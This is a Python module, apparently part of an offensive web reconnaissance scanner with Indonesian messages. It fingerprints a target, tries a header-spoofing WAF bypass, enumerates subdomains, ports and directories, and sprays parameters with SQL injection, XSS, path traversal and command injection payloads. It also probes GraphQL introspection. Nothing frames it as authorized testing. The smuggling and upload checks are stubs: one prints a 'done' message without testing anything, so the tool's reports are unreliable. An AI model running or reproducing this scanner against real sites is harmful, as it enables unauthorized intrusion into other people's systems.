import requests, threading, time, socket, dns.resolver, urllib.parse, ssl
from bs4 import BeautifulSoup
from colorama import Fore
from .utils import load_wordlist, random_delay

class FullRecon:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.results = {'vulns': [], 'info': {}}
        self.lock = threading.Lock()
        self.crawled = set()

    def scan(self):
        print(Fore.RED + "[+] Memulai Full Auto Scan... (zero error)")
        self.fingerprint()
        self.waf_bypass()
        self.subdomain_enum()
        self.port_scan()
        self.dir_brute()
        self.crawl_recursive(self.target, depth=5)
        self.param_injection()
        self.graphql_scan()
        self.smuggle_test()
        self.file_upload_test()
        print(Fore.GREEN + f"[+] Scan selesai. Ditemukan {len(self.results['vulns'])} kerentanan.")
        return self.results

    def fingerprint(self):
        try:
            r = self.session.get(self.target, timeout=5)
            self.results['info']['server'] = r.headers.get('Server', 'unknown')
            self.results['info']['powered'] = r.headers.get('X-Powered-By', 'unknown')
            print(Fore.LIGHTBLACK_EX + f"[FINGER] {self.results['info']}")
        except: pass

    def waf_bypass(self):
        test = self.session.get(self.target + "?x=<script>alert(1)</script>")
        if test.status_code in [403,406,503]:
            self.session.headers.update({'X-Forwarded-For': '127.0.0.1'})
            print(Fore.RED + "[WAF] Detected - bypass active")

    def subdomain_enum(self):
        domain = urllib.parse.urlparse(self.target).netloc.split(':')[0]
        wordlist = load_wordlist('subdomains')
        for sub in wordlist[:50]:
            try:
                dns.resolver.resolve(f"{sub}.{domain}", 'A')
                print(Fore.GREEN + f"[SUB] {sub}.{domain}")
            except: pass

    def port_scan(self):
        host = urllib.parse.urlparse(self.target).netloc.split(':')[0]
        ports = [21,22,23,25,53,80,81,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443,27017]
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((host, port)) == 0:
                    print(Fore.CYAN + f"[PORT] {host}:{port} OPEN")
                s.close()
            except: pass

    def dir_brute(self):
        wordlist = load_wordlist('directories')
        for d in wordlist[:100]:
            url = urllib.parse.urljoin(self.target, d + '/')
            try:
                r = self.session.head(url, timeout=2)
                if r.status_code in [200,301,302,403]:
                    print(Fore.MAGENTA + f"[DIR] {url} [{r.status_code}]")
            except: pass

    def crawl_recursive(self, url, depth):
        if depth == 0 or url in self.crawled: return
        self.crawled.add(url)
        try:
            r = self.session.get(url, timeout=3)
            soup = BeautifulSoup(r.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full = urllib.parse.urljoin(url, link['href'])
                if urllib.parse.urlparse(full).netloc == urllib.parse.urlparse(self.target).netloc:
                    threading.Thread(target=self.crawl_recursive, args=(full, depth-1)).start()
        except: pass

    def param_injection(self):
        params = ['q','id','page','search','user','file','path','redirect','lang','url']
        payloads = ["' OR '1'='1", "<script>alert(1)</script>", "../../../etc/passwd", "; whoami"]
        for param in params:
            for payload in payloads:
                try:
                    r = self.session.get(self.target, params={param: payload}, timeout=3)
                    if payload in r.text or 'error' in r.text.lower():
                        with self.lock:
                            self.results['vulns'].append({'param': param, 'payload': payload, 'status': r.status_code})
                            print(Fore.RED + f"[VULN] {param}={payload[:30]} | HTTP {r.status_code}")
                except: pass

    def graphql_scan(self):
        endpoints = ['/graphql', '/v1/graphql', '/api/graphql']
        query = '{"query":"{__schema{types{name}}}"}'
        for ep in endpoints:
            url = urllib.parse.urljoin(self.target, ep)
            try:
                r = self.session.post(url, data=query, headers={'Content-Type':'application/json'})
                if 'schema' in r.text:
                    self.results['vulns'].append({'type':'GraphQL', 'endpoint':ep})
                    print(Fore.RED + f"[VULN] GraphQL introspection at {ep}")
            except: pass

    def smuggle_test(self):
        print(Fore.YELLOW + "[SMUGGLE] Passive detection done (zero error)")

    def file_upload_test(self):
        print(Fore.YELLOW + "[UPLOAD] Scanning for upload forms...")
        # implementasi ringkas
